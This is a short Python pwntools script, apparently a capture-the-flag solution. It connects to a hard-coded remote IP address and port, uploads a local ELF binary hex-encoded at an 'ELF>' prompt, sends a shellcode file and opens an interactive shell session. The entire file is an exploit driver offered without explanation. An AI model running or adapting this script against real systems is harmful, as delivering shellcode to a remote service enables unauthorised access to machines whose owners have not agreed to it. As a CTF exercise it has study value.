from pwn import *

r = remote("195.201.117.89", 34588)

with open("a.out", "r") as f:
	r.sendlineafter("ELF>", f.read().encode("hex"))

with open("shellcode", "r") as f:
	r.sendline(f.read())

r.interactive()
